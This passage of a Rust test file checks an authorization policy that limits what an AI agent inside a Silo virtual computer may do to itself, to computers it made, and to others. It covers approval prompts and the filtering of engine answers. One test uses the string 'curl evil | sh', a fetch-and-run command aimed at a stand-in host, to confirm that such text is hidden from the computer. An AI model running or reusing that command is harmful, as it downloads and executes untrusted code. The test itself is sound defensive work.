use std::collections::{BTreeSet, HashMap, HashSet};

use serde_json::{json, Value};
use silo_api::methods::{method_registry, MethodName};

use super::*;

/// A well-formed Ed25519 public key whose 32 key bytes are all `byte`.
fn ed25519_key(byte: u8) -> String {
    use base64::Engine;
    let mut data = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x20".to_vec();
    data.extend([byte; 32]);
    format!(
        "ssh-ed25519 {}",
        base64::engine::general_purpose::STANDARD.encode(data)
    )
}

/// `main`, with `fork-1` and `fork-2` its agent made and `grand` that `fork-1`'s agent made
/// below it, `by-hand` that the owner forked from main, and an unrelated `stranger`.
struct World {
    created: HashMap<&'static str, &'static str>,
    access: HashMap<&'static str, Access>,
    github: Option<Vec<Value>>,
    sizes: HashMap<&'static str, Resources>,
    ssh_keys: Vec<String>,
}

impl Default for World {
    fn default() -> Self {
        let github = |all: bool, repositories: &[&str]| GitHubAccess {
            method: "oauth".into(),
            all,
            repositories: repositories.iter().map(|r| (*r).to_owned()).collect(),
        };
        let access = HashMap::from([
            (
                "main",
                Access {
                    secrets: ["npm".to_owned()].into(),
                    github: Some(github(false, &["me/app", "me/lib"])),
                },
            ),
            (
                "fork-1",
                Access {
                    secrets: ["npm".to_owned(), "prod-db".to_owned()].into(),
                    github: Some(github(true, &[])),
                },
            ),
            (
                "fork-2",
                Access {
                    secrets: BTreeSet::new(),
                    github: Some(github(false, &["me/app"])),
                },
            ),
        ]);
        Self {
            created: HashMap::from([("fork-1", "main"), ("fork-2", "main"), ("grand", "fork-1")]),
            access,
            sizes: {
                let same = Resources::of_linux(&json!({"cpus": 2, "maxCPUs": 4, "memoryGiB": 4,
                    "maxMemoryGiB": 8, "workspaceStorageGiB": 20, "runtimeStorageGiB": 10}))
                .unwrap();
                HashMap::from([
                    ("main", same),
                    ("fork-1", same),
                    ("fork-2", same),
                    ("grand", same),
                    ("recipe-build", same),
                ])
            },
            github: Some(vec![
                json!({"computerId": "main", "repositoryMode": "selected"}),
                json!({"computerId": "stranger", "repositoryMode": "all"}),
            ]),
            ssh_keys: vec![ed25519_key(1)],
        }
    }
}

impl super::World for World {
    fn made(&self, creator: &str) -> HashSet<String> {
        let mut made = HashSet::new();
        let mut frontier = vec![creator.to_owned()];
        while let Some(parent) = frontier.pop() {
            for (child, of) in &self.created {
                if *of == parent && made.insert((*child).to_owned()) {
                    frontier.push((*child).to_owned());
                }
            }
        }
        made
    }
    fn parent(&self, computer: &str) -> Option<String> {
        match computer {
            "fork-1" | "fork-2" | "by-hand" => Some("main".into()),
            "grand" => Some("fork-1".into()),
            _ => None,
        }
    }
    fn name(&self, computer: &str) -> Option<String> {
        match computer {
            "recipe-build" => Some("silo-build-linux-dev-0123abcd".to_owned()),
            _ => Some(format!("{computer}-name")),
        }
    }
    fn owns_job(&self, caller: &str, job_id: &str) -> bool {
        caller == "main" && job_id == "job:mine"
    }
    fn request_fork(&self, request_id: &str) -> Option<String> {
        match request_id {
            "fr-mine" => Some("fork-1".into()),
            "fr-nested" => Some("grand".into()),
            "fr-hand" => Some("by-hand".into()),
            _ => None,
        }
    }
    fn request_target(&self, request_id: &str) -> Option<String> {
        match request_id {
            "fr-mine" => Some("main".into()),
            "fr-nested" => Some("fork-1".into()),
            _ => None,
        }
    }
    fn resources(&self, computer: &str) -> Option<Resources> {
        self.sizes.get(computer).copied()
    }
    fn ssh_settings(&self, _computer: &str) -> Option<(u16, String)> {
        Some((2200, "127.0.0.1".into()))
    }
    fn ssh_keys(&self, _computer: &str) -> Vec<String> {
        self.ssh_keys.clone()
    }
    fn network_policy(&self, _computer: &str) -> Option<NetworkPolicy> {
        Some(NetworkPolicy::default())
    }
    fn access(&self, computer: &str) -> Access {
        self.access.get(computer).cloned().unwrap_or_default()
    }
    fn github_policies(&self) -> Option<Vec<Value>> {
        self.github.clone()
    }
    fn github_token_name(&self, id: &str) -> Option<String> {
        (id == "tok-work").then(|| "work".to_owned())
    }
    fn new_id(&self) -> String {
        "fresh-id".into()
    }
}

fn method(name: &str) -> MethodName {
    MethodName::from_name(name).unwrap_or_else(|| panic!("{name} is not a method"))
}

fn as_computer(caller: &str, name: &str, params: Value) -> Decision {
    decide(
        &Caller::Computer { id: caller.into() },
        method(name),
        &params,
        &World::default(),
    )
}

fn check(name: &str, params: Value) -> Decision {
    as_computer("main", name, params)
}

fn allowed(decision: &Decision) -> bool {
    matches!(decision, Decision::Allow(_))
}

fn refused(decision: &Decision) -> bool {
    matches!(decision, Decision::Refuse { .. })
}

fn asked(decision: &Decision) -> Option<ApprovalKind> {
    match decision {
        Decision::Ask { kind, .. } => Some(*kind),
        _ => None,
    }
}

fn params_of(decision: Decision) -> Value {
    match decision {
        Decision::Allow(Allowed {
            params: Some(params),
            ..
        }) => params,
        other => panic!("not allowed with parameters: {other:?}"),
    }
}

#[test]
fn every_method_has_a_rule_and_the_owner_may_call_every_one() {
    for descriptor in method_registry() {
        let _ = rule(descriptor.method);
        let decision = decide(
            &Caller::owner("app"),
            descriptor.method,
            &json!({"computerId": "stranger"}),
            &World::default(),
        );
        assert_eq!(decision, allow(), "{}", descriptor.name);
    }
}

#[test]
fn a_device_keeps_the_connections_lists() {
    let device = Caller::Device {
        key: Some("SHA256:abc".into()),
    };
    let world = World::default();
    for descriptor in method_registry() {
        let decision = decide(&device, descriptor.method, &json!({}), &world);
        assert_eq!(
            allowed(&decision),
            crate::remote::is_owner_method(descriptor.name),
            "{}",
            descriptor.name
        );
    }
}

#[test]
fn owner_only_methods_are_refused_whatever_the_parameters() {
    for name in [
        "settings.read",
        "settings.update",
        "connections.status",
        "connections.keys.authorize",
        "exports.create",
        "exports.import",
        "secrets.list",
        "secrets.remove",
        "github.state",
        "github.connect",
        "guestClient.enable",
        "guestClient.revoke",
        "engine.shutdown",
        "updates.download",
        "events.subscribe",
        "notifications.list",
        "operations.list",
        "files.upload",
        "files.download",
        "terminal.command",
        "display.show",
        "network.state",
        "computers.configuration.change",
        "changes.baseline",
        "changes.capture",
        "changes.requests.markKept",
        "recipes.build",
        "recipes.save",
        "recipes.remove",
    ] {
        let decision = check(name, json!({"computerId": "fork-1", "forkId": "fork-1"}));
        match decision {
            Decision::Refuse { reason } => {
                assert!(!reason.contains(name), "{name}: {reason}");
                assert!(reason.contains("person who runs Silo"), "{name}: {reason}");
            }
            other => panic!("{name}: {other:?}"),
        }
    }
}

#[test]
fn a_refusal_names_the_command_not_the_wire_method() {
    let Decision::Refuse { reason } = check("guestClient.enable", json!({"computerId": "main"})) else {
        panic!("guestClient.enable was not refused");
    };
    assert!(reason.contains("silo tools enable"), "{reason}");
    assert!(!reason.contains("guestClient"), "{reason}");
}

#[test]
fn a_computer_reads_its_own_tools_status_and_no_other() {
    assert!(allowed(&check("guestClient.status", json!({"computerId": "main"}))));
    for target in ["fork-1", "grand", "stranger", "by-hand"] {
        let Decision::Refuse { reason } = check("guestClient.status", json!({"computerId": target})) else {
            panic!("{target} was not refused");
        };
        assert!(!reason.contains("guestClient"), "{reason}");
        assert!(reason.contains("its own"), "{reason}");
    }
    assert!(refused(&check("guestClient.status", json!({}))));
}

#[test]
fn open_methods_are_allowed_and_job_methods_need_the_callers_job() {
    for name in ["engine.handshake", "engine.state", "device.facts", "device.resources", "engine.disconnect"] {
        assert!(allowed(&check(name, json!({}))), "{name}");
    }
    for name in [
        "operations.job.get",
        "operations.job.acknowledge",
        "operations.cancel",
        "guest.exec.get",
        "guest.exec.input",
    ] {
        assert!(allowed(&check(name, json!({"jobId": "job:mine"}))), "{name}");
        assert!(refused(&check(name, json!({"jobId": "job:theirs"}))), "{name}");
        assert!(refused(&as_computer("fork-1", name, json!({"jobId": "job:mine"}))));
    }
}

#[test]
fn tree_methods_reach_the_caller_and_what_it_made_through_others_too() {
    for name in [
        "changes.diff",
        "steps.list",
        "checkpoints.create",
        "logs.query",
        "guest.files.read",
        "computers.credentials",
        "network.urls",
    ] {
        for target in ["main", "fork-1", "grand"] {
            assert!(allowed(&check(name, json!({"computerId": target}))), "{name} {target}");
        }
        for target in ["stranger", "by-hand"] {
            assert!(refused(&check(name, json!({"computerId": target}))), "{name} {target}");
        }
        assert!(refused(&check(name, json!({}))), "{name} without a target");
    }
}

#[test]
fn made_methods_reach_only_what_the_caller_made_never_itself() {
    for name in [
        "guest.exec",
        "guest.exec.start",
        "guest.files.write",
        "computers.start",
        "computers.stop",
        "computers.delete",
        "checkpoints.restore",
        "checkpoints.delete",
        "desktop.action",
        "steps.record",
    ] {
        assert!(allowed(&check(name, json!({"computerId": "fork-2"}))), "{name}");
        assert!(allowed(&check(name, json!({"computerId": "grand"}))), "{name}");
        for target in ["main", "stranger", "by-hand"] {
            assert!(refused(&check(name, json!({"computerId": target}))), "{name} {target}");
        }
    }
    // A computer made by another computer is not its maker's maker's to reach upward.
    assert!(refused(&as_computer("fork-1", "guest.exec", json!({"computerId": "main"}))));
    assert!(refused(&as_computer("fork-1", "guest.exec", json!({"computerId": "fork-2"}))));
    assert!(allowed(&as_computer("fork-1", "guest.exec", json!({"computerId": "grand"}))));
}

#[test]
fn a_computer_cannot_reach_a_computer_its_owner_forked_by_hand() {
    // `by-hand` is main's child in the tree, but main's agent did not make it.
    for (name, params) in [
        ("guest.exec", json!({"computerId": "by-hand"})),
        ("changes.diff", json!({"computerId": "by-hand"})),
        ("checkpoints.fork", json!({"computerId": "by-hand", "newName": "x"})),
        ("changes.keep", json!({"forkId": "by-hand"})),
        ("changes.promote", json!({"forkId": "by-hand"})),
        ("changes.requests.show", json!({"requestId": "fr-hand"})),
        ("changes.requests.keep", json!({"requestId": "fr-hand"})),
        ("network.publish", json!({"computerId": "by-hand", "port": 80})),
    ] {
        assert!(refused(&check(name, params.clone())), "{name} {params}");
    }
    let visible = BTreeSet::from(["main".to_owned(), "fork-1".to_owned()]);
    let mut tree = json!({"nodes": [{"id": "main"}, {"id": "by-hand", "parent": "main"}]});
    filter_result(Filter::Tree, &mut tree, &visible);
    assert_eq!(tree["nodes"].as_array().unwrap().len(), 1);
}

#[test]
fn nothing_routes_a_call_to_another_device() {
    for params in [
        json!({"allDevices": true}),
        json!({"deviceIds": ["other"]}),
        json!({"deviceId": "other"}),
    ] {
        assert!(refused(&check("changes.requests.list", params.clone())), "{params}");
        assert!(refused(&check("computers.list", params)));
    }
    assert!(allowed(&check("computers.list", json!({"deviceId": "local"}))));
    let list = check("changes.requests.list", json!({"status": "open", "allDevices": false}));
    assert_eq!(params_of(list), json!({"status": "open"}));
    assert!(refused(&check("computers.list", json!("text"))));
}

#[test]
fn lists_ask_for_only_the_lists_and_are_cut_to_the_callers_computers() {
    let list = check("computers.list", json!({"refreshRepositories": true}));
    let Decision::Allow(list) = list else {
        panic!("{list:?}")
    };
    assert_eq!(list.params, Some(json!({})));
    assert_eq!(list.filter, Filter::Computers);
    let visible = BTreeSet::from(["main".to_owned(), "fork-1".to_owned()]);
    let mut computers = json!({
        "extra": "dropped",
        "linux": {"other": 1, "computers": [
            {"configuration": {"id": "main"}}, {"configuration": {"id": "fork-1"}},
            {"configuration": {"id": "stranger"}}]},
        "macos": {"computers": [{"id": "stranger"}]}
    });
    filter_result(Filter::Computers, &mut computers, &visible);
    assert_eq!(computers["linux"]["computers"].as_array().unwrap().len(), 2);
    assert!(computers.get("extra").is_none());
    assert!(computers["macos"]["computers"].as_array().unwrap().is_empty());
    let mut requests = json!({"requests": [
        {"request": {"forkId": "fork-1"}}, {"request": {"forkId": "stranger"}}]});
    filter_result(Filter::Requests, &mut requests, &visible);
    assert_eq!(requests["requests"].as_array().unwrap().len(), 1);
    let mut tree = json!({"nodes": [
        {"id": "fork-1", "parent": "main"},
        {"id": "main", "parent": "outside"}]});
    filter_result(Filter::Tree, &mut tree, &visible);
    assert_eq!(tree["nodes"][0]["parent"], "main");
    assert_eq!(tree["nodes"][1]["parent"], Value::Null);
}

#[test]
fn recipes_can_be_read_by_a_computer_and_a_recipe_build_can_be_forked() {
    assert!(allowed(&check("recipes.list", json!({}))));
    assert!(allowed(&check("recipes.get", json!({"name": "linux-dev"}))));
    assert!(allowed(&check("computers.recipe", json!({"computerId": "main"}))));
    assert!(refused(&check("computers.recipe", json!({"computerId": "stranger"}))));
    // The hidden computer a recipe was built in is a source any computer may fork.
    let Decision::Allow(granted) = check(
        "checkpoints.fork",
        json!({"computerId": "recipe-build", "newName": "from-recipe"}),
    ) else {
        panic!("not allowed")
    };
    assert_eq!(
        granted.creates,
        Some(Creation {
            name: "from-recipe".into(),
            id: None,
            source: Some("recipe-build".into())
        })
    );
    // It is no way to hand over secrets the caller does not have.
    assert!(!allowed(&check(
        "checkpoints.fork",
        json!({"computerId": "recipe-build", "newName": "x", "secrets": ["prod-db"]})
    )));
    // Another computer's own fork is still out of reach.
    assert!(refused(&check(
        "checkpoints.fork",
        json!({"computerId": "stranger", "newName": "x"})
    )));
}

#[test]
fn a_fork_of_itself_or_of_what_it_made_is_free_and_loses_the_token_file() {
    let params = json!({"computerId": "main", "newName": "x", "recipeHash": "h",
        "quiet": {"stop": ["poller"], "scrub": ["/home/x"]}, "secrets": ["npm", "github"]});
    let Decision::Allow(granted) = check("checkpoints.fork", params) else {
        panic!("not allowed")
    };
    let rewritten = granted.params.unwrap();
    assert_eq!(rewritten["quiet"]["stop"], json!(["poller"]));
    assert_eq!(
        rewritten["quiet"]["scrub"],
        json!(["/home/x", GUEST_ENDPOINT_PATH])
    );
    assert!(rewritten.get("recipeHash").is_none());
    assert_eq!(rewritten["secrets"], json!(["npm", "github"]));
    assert_eq!(
        granted.creates,
        Some(Creation {
            name: "x".into(),
            id: None,
            source: Some("main".into())
        })
    );
    // fork-2's GitHub access is within main's, and it has no secrets.
    assert!(allowed(&check(
        "checkpoints.fork",
        json!({"computerId": "fork-2", "newName": "y", "secrets": ["github"]})
    )));
    assert!(refused(&check(
        "checkpoints.fork",
        json!({"computerId": "stranger", "newName": "x"})
    )));
}

#[test]
fn handing_over_access_the_caller_does_not_have_asks() {
    // A secret main does not have.
    let decision = check(
        "checkpoints.fork",
        json!({"computerId": "main", "newName": "x", "secrets": ["prod-db"]}),
    );
    assert_eq!(asked(&decision), Some(ApprovalKind::Access));
    // fork-1 holds a secret and GitHub access to every repository that the owner gave it.
    let decision = check(
        "checkpoints.fork",
        json!({"computerId": "fork-1", "newName": "x", "secrets": ["prod-db"]}),
    );
    assert_eq!(asked(&decision), Some(ApprovalKind::Access));
    let decision = check(
        "checkpoints.fork",
        json!({"computerId": "fork-1", "newName": "x", "secrets": ["github"]}),
    );
    match decision {
        Decision::Ask { summary, .. } => assert!(summary.contains("GitHub"), "{summary}"),
        other => panic!("{other:?}"),
    }
    // A secret both have is free.
    assert!(allowed(&check(
        "checkpoints.fork",
        json!({"computerId": "fork-1", "newName": "x", "secrets": ["npm"]})
    )));
    // A computer with no GitHub access cannot hand any over.
    assert_eq!(
        asked(&as_computer(
            "grand",
            "checkpoints.fork",
            json!({"computerId": "grand", "newName": "z", "secrets": ["github"]})
        )),
        Some(ApprovalKind::Access)
    );
    // An earlier checkpoint of the caller can hold what was taken away since.
    assert_eq!(
        asked(&check(
            "checkpoints.fork",
            json!({"computerId": "main", "newName": "x", "checkpointId": "cp"})
        )),
        Some(ApprovalKind::Access)
    );
    assert!(allowed(&check(
        "checkpoints.fork",
        json!({"computerId": "fork-2", "newName": "x", "checkpointId": "cp"})
    )));
}

#[test]
fn an_ask_that_makes_a_computer_carries_the_call_to_run_and_the_computer() {
    match check(
        "checkpoints.fork",
        json!({"computerId": "main", "newName": "x", "secrets": ["prod-db"], "extra": 1}),
    ) {
        Decision::Ask {
            params: Some(params),
            creates: Some(creates),
            ..
        } => {
            // The rewrite the engine runs on allow: the token file is scrubbed, nothing else
            // the caller sent is passed on.
            assert_eq!(params["computerId"], "main");
            assert!(params.get("extra").is_none());
            assert!(params["quiet"]["scrub"]
                .as_array()
                .unwrap()
                .contains(&json!(GUEST_ENDPOINT_PATH)));
            assert_eq!(creates.name, "x");
            assert_eq!(creates.source.as_deref(), Some("main"));
        }
        other => panic!("{other:?}"),
    }
    let mut container = json!({"kind": "linux", "configuration": {
        "name": "box", "id": "mine", "cpus": 2, "maxCPUs": 2, "memoryGiB": 4,
        "maxMemoryGiB": 4, "workspaceStorageGiB": 10, "runtimeStorageGiB": 10}});
    container["configuration"]["runtime"] = json!("container");
    match check("computers.create", container) {
        Decision::Ask {
            params: Some(params),
            creates: Some(creates),
            ..
        } => {
            let id = params["configuration"]["id"].as_str().unwrap();
            assert_ne!(id, "mine");
            assert_eq!(creates.id.as_deref(), Some(id));
        }
        other => panic!("{other:?}"),
    }
    // Other asks run the caller's own parameters.
    match check("changes.promote", json!({"forkId": "fork-1"})) {
        Decision::Ask {
            params: None,
            creates: None,
            ..
        } => {}
        other => panic!("{other:?}"),
    }
}

#[test]
fn github_access_covers_a_read_only_copy_only_within_itself() {
    let selected = |repositories: &[&str]| GitHubAccess {
        method: "oauth".into(),
        all: false,
        repositories: repositories.iter().map(|r| (*r).to_owned()).collect(),
    };
    let all = GitHubAccess {
        method: "oauth".into(),
        all: true,
        repositories: BTreeSet::new(),
    };
    assert!(selected(&["a", "b"]).covers(&selected(&["a"])));
    assert!(!selected(&["a"]).covers(&selected(&["a", "b"])));
    assert!(!selected(&["a"]).covers(&all));
    assert!(all.covers(&selected(&["z"])));
    let token = GitHubAccess {
        method: "token".into(),
        ..all.clone()
    };
    assert!(!token.covers(&selected(&["a"])));
    let read = GitHubAccess::from_assignment(&json!({
        "repositoryMode": "selected",
        "repositories": [{"repository": "Me/App", "allowPushes": true}]
    }))
    .unwrap();
    assert_eq!(read, selected(&["me/app"]));
}

#[test]
fn reserved_names_are_refused_and_a_new_linux_computer_gets_the_engines_id() {
    for name in ["silo-build-x", "silo-baseline-1", "", "  "] {
        let fork = json!({"computerId": "main", "newName": name});
        assert!(refused(&check("checkpoints.fork", fork)), "{name:?}");
    }
    let create = json!({"kind": "linux", "configuration": {"id": "main", "name": "box",
        "cpus": 2, "maxCPUs": 2, "memoryGiB": 4, "maxMemoryGiB": 4,
        "workspaceStorageGiB": 10, "runtimeStorageGiB": 10}});
    let Decision::Allow(granted) = check("computers.create", create.clone()) else {
        panic!("not allowed")
    };
    assert_eq!(granted.params.unwrap()["configuration"]["id"], "fresh-id");
    assert_eq!(granted.creates.unwrap().id.as_deref(), Some("fresh-id"));
    let mut container = create.clone();
    container["configuration"]["runtime"] = json!("container");
    assert_eq!(
        asked(&check("computers.create", container)),
        Some(ApprovalKind::Container)
    );
    let macos = json!({"kind": "macos", "request": {"name": "silo-build-m", "cpus": 4,
        "memoryGiB": 8, "diskGiB": 64}});
    assert!(refused(&check("computers.create", macos)));
    let macos = json!({"kind": "macos", "request": {"name": "mac", "cpus": 2,
        "memoryGiB": 4, "diskGiB": 30}});
    assert!(allowed(&check("computers.create", macos)));
}

#[test]
fn merging_into_what_it_made_is_free_and_into_itself_asks() {
    assert!(allowed(&check("changes.keep", json!({"forkId": "grand"}))));
    assert_eq!(
        asked(&check("changes.keep", json!({"forkId": "fork-1"}))),
        Some(ApprovalKind::Merge)
    );
    assert!(refused(&check(
        "changes.keep",
        json!({"forkId": "fork-1", "targetId": "stranger"})
    )));
    assert!(refused(&as_computer("fork-1", "changes.keep", json!({"forkId": "fork-1"}))));
    // Replacing itself asks; replacing a computer it made is as free as merging into one.
    assert_eq!(
        asked(&check("changes.promote", json!({"forkId": "fork-1"}))),
        Some(ApprovalKind::ReplaceMain)
    );
    assert!(allowed(&check("changes.promote", json!({"forkId": "grand"}))));
    assert!(allowed(&check(
        "changes.promote",
        json!({"forkId": "grand", "targetId": "fork-1"})
    )));
    assert!(refused(&check(
        "changes.promote",
        json!({"forkId": "grand", "targetId": "stranger"})
    )));
    assert_eq!(
        asked(&check("changes.requests.keep", json!({"requestId": "fr-mine"}))),
        Some(ApprovalKind::Merge)
    );
    assert!(allowed(&check("changes.requests.keep", json!({"requestId": "fr-nested"}))));
    assert!(allowed(&check("changes.undo", json!({"computerId": "fork-1"}))));
    assert_eq!(
        asked(&check("changes.undo", json!({"computerId": "main"}))),
        Some(ApprovalKind::Merge)
    );
    assert!(refused(&check("changes.undo", json!({"computerId": "stranger"}))));
}

#[test]
fn a_review_request_is_for_what_it_made_and_targets_its_tree() {
    assert!(allowed(&check("changes.request", json!({"forkId": "fork-1"}))));
    assert!(allowed(&check(
        "changes.request",
        json!({"forkId": "fork-1", "targetId": "main"})
    )));
    assert!(refused(&check(
        "changes.request",
        json!({"forkId": "fork-1", "targetId": "stranger"})
    )));
    assert!(refused(&check("changes.request", json!({"forkId": "stranger"}))));
    assert!(allowed(&check("changes.requests.show", json!({"requestId": "fr-mine"}))));
    assert!(refused(&check("changes.requests.show", json!({"requestId": "fr-none"}))));
}

fn push_params(computer: &str) -> Value {
    json!({"computerId": computer, "repositoryPath": "/workspace/app",
        "operationId": "0b9f6f57-6d4b-4c8e-8a39-2a3cf8a5c0d1",
        "target": {"repository": "acme/app", "branch": "main",
            "commit": "0123456789abcdef0123456789abcdef01234567"}})
}

#[test]
fn widening_calls_ask_and_narrowing_ones_are_free() {
    assert_eq!(
        asked(&check("network.publish", json!({"computerId": "fork-1", "port": 8080}))),
        Some(ApprovalKind::Port)
    );
    assert!(allowed(&check("network.unpublish", json!({"computerId": "fork-1", "port": 8080}))));
    assert_eq!(
        asked(&check("sshAccess.save", json!({"computerId": "main", "enabled": true,
            "port": 2222, "bindAddress": "127.0.0.1"}))),
        Some(ApprovalKind::Ssh)
    );
    assert!(allowed(&check("sshAccess.save", json!({"computerId": "main", "enabled": false,
        "port": 2222, "bindAddress": "127.0.0.1"}))));
    assert_eq!(
        asked(&check("push.start", push_params("fork-1"))),
        Some(ApprovalKind::Github)
    );
    assert!(refused(&check(
        "push.start",
        json!({"computerId": "fork-1", "repositoryPath": "/w"})
    )));
    let secret = |operation: &str, computers: Value| {
        json!({"request": {"operation": operation, "name": "token", "value": "s3cr3t-value",
            "computerIds": computers, "allowedDomains": ["api.example.com"]}})
    };
    match check("secrets.save", secret("add", json!(["fork-1"]))) {
        Decision::Ask { kind, summary, .. } => {
            assert_eq!(kind, ApprovalKind::Secret);
            assert!(summary.contains("api.example.com"), "{summary}");
            assert!(!summary.contains("s3cr3t-value"), "{summary}");
        }
        other => panic!("{other:?}"),
    }
    assert!(refused(&check("secrets.save", secret("add", json!(["stranger"])))));
    assert!(refused(&check("secrets.save", secret("edit", json!(["fork-1"])))));
}

#[test]
fn a_github_configuration_may_change_only_the_callers_tree() {
    let save = |computers: Value| json!({"configuration": {"computers": computers}});
    let unchanged_stranger = json!({"computerId": "stranger", "repositoryMode": "all"});
    assert_eq!(
        asked(&check(
            "github.configuration.save",
            save(json!([{"computerId": "main", "repositoryMode": "all"}, unchanged_stranger]))
        )),
        Some(ApprovalKind::Github)
    );
    // Dropping or changing another computer's policy is refused.
    assert!(refused(&check(
        "github.configuration.save",
        save(json!([{"computerId": "main", "repositoryMode": "selected"}]))
    )));
    assert!(refused(&check(
        "github.configuration.save",
        save(json!([{"computerId": "main", "repositoryMode": "selected"},
            {"computerId": "stranger", "repositoryMode": "selected"}]))
    )));
}

fn summary_of(decision: Decision) -> String {
    match decision {
        Decision::Ask { summary, .. } => summary,
        other => panic!("{other:?}"),
    }
}

#[test]
fn a_github_token_choice_says_what_it_gives_and_names_the_token() {
    let save = |policy: Value| {
        json!({"configuration": {"computers": [policy,
            {"computerId": "stranger", "repositoryMode": "all"}]}})
    };
    let token = |secret: Option<&str>| {
        let mut policy = json!({"computerId": "main", "repositoryMode": "selected",
            "authenticationMethod": "token"});
        if let Some(secret) = secret {
            policy["tokenSecretId"] = json!(secret);
        }
        policy
    };
    let summary = summary_of(check("github.configuration.save", save(token(Some("tok-work")))));
    assert!(summary.contains("work"), "{summary}");
    assert!(summary.contains("full permissions"), "{summary}");
    assert!(!summary.contains("tok-work"), "{summary}");
    // No token named, or one that does not exist, is refused rather than defaulted.
    assert!(refused(&check("github.configuration.save", save(token(None)))));
    assert!(refused(&check("github.configuration.save", save(token(Some("tok-other"))))));
    // A change that keeps the same token adds no token sentence.
    let mut world = World::default();
    world.github = Some(vec![
        token(Some("tok-work")),
        json!({"computerId": "stranger", "repositoryMode": "all"}),
    ]);
    let mut renamed = token(Some("tok-work"));
    renamed["repositoryMode"] = json!("all");
    let kept = decide(
        &Caller::Computer { id: "main".into() },
        method("github.configuration.save"),
        &save(renamed),
        &world,
    );
    assert!(!summary_of(kept).contains("full permissions"));
}

#[test]
fn an_agent_asking_for_a_github_token_secret_is_told_what_it_gives() {
    let request = json!({"request": {"operation": "add", "kind": "github-token", "name": "work",
        "value": "synthetic-value", "computerIds": [], "allowedDomains": []}});
    let summary = summary_of(check("secrets.save", request));
    assert!(summary.contains("GitHub token “work”"), "{summary}");
    assert!(summary.contains("full permissions"), "{summary}");
    assert!(!summary.contains("only to"), "{summary}");
    assert!(!summary.contains("synthetic-value"), "{summary}");
}

#[test]
fn an_unchanged_github_configuration_is_refused_so_its_answer_never_reaches_a_computer() {
    let unchanged = json!({"configuration": {"computers": [
        {"computerId": "main", "repositoryMode": "selected"},
        {"computerId": "stranger", "repositoryMode": "all"}]}});
    assert!(refused(&check("github.configuration.save", unchanged)));
}

#[test]
fn every_answer_to_a_computer_is_cut_wherever_device_wide_state_sits() {
    let visible = BTreeSet::from(["main".to_owned(), "fork-1".to_owned()]);
    // The device's state, as a fork job's outcome or `computers.dismissError` answers it.
    let mut job = json!({"state": "finished", "outcome": {"result": {
        "computers": [{"configuration": {"id": "fork-1"}}, {"configuration": {"id": "stranger"}}],
        "secrets": [{"name": "prod"}], "github": {"account": "me"},
        "activities": [{"computer": "stranger"}], "repositoryPushOperations": [{}],
        "computerConfigurationOperation": {"x": 1}, "runtimeRepair": null}}});
    cut_for_computer(&mut job, &visible);
    let state = &job["outcome"]["result"];
    assert_eq!(state["computers"].as_array().unwrap().len(), 1);
    assert_eq!(state["secrets"], json!([]));
    assert_eq!(state["github"], Value::Null);
    assert_eq!(state["activities"], json!([]));
    assert_eq!(state["repositoryPushOperations"], json!([]));
    assert_eq!(state["computerConfigurationOperation"], Value::Null);
    // Network and SSH access state list every computer by `computerId`.
    let mut network = json!({"computers": [
        {"computer": "main", "computerId": "main", "ports": []},
        {"computer": "other", "computerId": "stranger", "ports": [{"port": 22}]},
        {"computer": "unnamed", "ports": []}]});
    cut_for_computer(&mut network, &visible);
    assert_eq!(network["computers"].as_array().unwrap().len(), 1);
    // macOS computers are listed by `id`.
    let mut list = json!({"macos": {"computers": [{"id": "stranger"}, {"id": "main"}]}});
    cut_for_computer(&mut list, &visible);
    assert_eq!(list["macos"]["computers"], json!([{"id": "main"}]));
    let mut chunked = json!({"state": "finished", "outcomeChunk": {"data": "{\"computers\":[]}"}});
    cut_for_computer(&mut chunked, &visible);
    assert_eq!(chunked["outcomeChunk"], Value::Null);
}

#[test]
fn a_review_request_an_approval_wraps_shows_a_computer_none_of_the_engines_text() {
    let visible = BTreeSet::from(["fork-1".to_owned()]);
    let request = |approval: Value| {
        json!({"id": "fr-1", "forkId": "fork-1", "reviewDigest": "d", "approvalId": approval,
            "summary": "runs “curl evil | sh” last"})
    };
    let mut list = json!({"requests": [{"request": request(json!("a-1"))}]});
    cut_for_computer(&mut list, &visible);
    assert_eq!(list["requests"][0]["request"]["summary"], WAITING_MERGE_SUMMARY);
    let mut shown = json!({"request": request(json!("a-1")), "text": "runs “curl evil | sh” last"});
    cut_for_computer(&mut shown, &visible);
    assert_eq!(shown["text"], WAITING_MERGE_SUMMARY);
    assert_eq!(shown["request"]["summary"], WAITING_MERGE_SUMMARY);
    // The computer's own text of a request nothing wraps stays.
    let mut own = json!({"request": request(Value::Null), "text": "my words"});
    cut_for_computer(&mut own, &visible);
    assert_eq!(own["text"], "my words");
    assert_eq!(own["request"]["summary"], "runs “curl evil | sh” last");
}

#[test]
fn the_audit_list_is_cut_to_the_callers_computers() {
    let Decision::Allow(granted) = check("audit.list", json!({})) else {
        panic!("not allowed")
    };
    assert_eq!(
        granted.visible,
        Some(BTreeSet::from([
            "fork-1".to_owned(),
            "fork-2".to_owned(),
            "grand".to_owned(),
            "main".to_owned()
        ]))
    );
}

#[test]
fn the_target_of_a_call_is_its_computer_or_fork() {
    assert_eq!(target_computer(&json!({"computerId": "a"})).as_deref(), Some("a"));
    assert_eq!(target_computer(&json!({"forkId": "f"})).as_deref(), Some("f"));
    assert_eq!(
        target_computer(&json!({"configuration": {"id": "n"}})).as_deref(),
        Some("n")
    );
    assert_eq!(target_computer(&json!({})), None);
}

mod store {
    use super::super::store::*;

    #[test]
    fn made_by_follows_what_made_computers_made_and_survives_a_reopen() {
        let directory = tempfile::tempdir().unwrap();
        let store = PolicyStore::new(directory.path());
        for (name, creator) in [("a", "main"), ("b", "id-a"), ("c", "other")] {
            store
                .begin(
                    creator,
                    Pending {
                        created_by: String::new(),
                        name: name.into(),
                        id: None,
                        source: None,
                        job_id: None,
                        at: 0,
                    },
                )
                .unwrap();
            store.confirm(creator, name, &format!("id-{name}")).unwrap();
        }
        let reopened = PolicyStore::new(directory.path()).snapshot().unwrap();
        assert_eq!(
            reopened.made_by("main"),
            ["id-a".to_owned(), "id-b".to_owned()].into()
        );
        assert!(reopened.pending.is_empty());
        let file = directory.path().join("policy/computers.json");
        let mode = std::fs::metadata(&file).unwrap();
        assert_eq!(
            std::os::unix::fs::PermissionsExt::mode(&mode.permissions()) & 0o777,
            0o600
        );
    }

    #[test]
    fn pending_computers_are_recorded_when_their_job_succeeds_and_dropped_when_it_fails() {
        let directory = tempfile::tempdir().unwrap();
        let store = PolicyStore::new(directory.path());
        let pending = |name: &str, id: Option<&str>| Pending {
            created_by: String::new(),
